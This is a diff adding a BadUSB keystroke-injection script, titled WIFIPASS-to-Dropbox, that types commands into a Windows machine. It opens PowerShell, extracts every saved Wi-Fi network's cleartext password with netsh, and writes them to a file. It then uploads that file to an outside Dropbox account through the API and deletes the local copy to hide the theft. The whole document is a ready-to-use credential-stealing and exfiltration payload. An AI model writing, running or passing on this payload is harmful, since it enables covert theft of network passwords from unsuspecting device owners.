@@ -1,0 +1,42 @@
+TITLE WIFIPASS-to-Dropbox
+PRESS GUI R
+RELEASEALL
+SLEEP 2
+STRING cmd
+SEND ENTER
+SLEEP 2
+STRING powershell
+SEND ENTER
+SLEEP 2
+STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | % {(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize > $env:USERPROFILE\Desktop\log.txt
+SLEEP 1
+SEND ENTER
+SLEEP 1
+STRING $targetPathAndFilename = ' "/log.txt" '
+SEND ENTER
+STRING $arg = '{ "path": '+$targetpathAndFilename+', "mode": "add", "autorename": true, "mute": false }'
+SEND ENTER
+STRING $authorization = "Bearer DROPBOXAPIKEY"
+SEND ENTER
+STRING $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+SEND ENTER
+STRING $headers.Add("Authorization", $authorization)
+SEND ENTER
+STRING $headers.Add("Dropbox-API-Arg", $arg)
+SEND ENTER
+STRING $headers.Add("Content-Type", 'application/octet-stream')
+SEND ENTER
+STRING $response = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $env:USERPROFILE\Desktop\log.txt -Headers $headers
+SEND ENTER
+SLEEP 1
+STRING cd $env:USERPROFILE\Desktop
+SEND ENTER
+SLEEP 1
+STRING del log.txt
+SEND ENTER
+SLEEP 1
+STRING exit
+SEND ENTER
+SLEEP 1
+STRING exit
+SEND ENTER
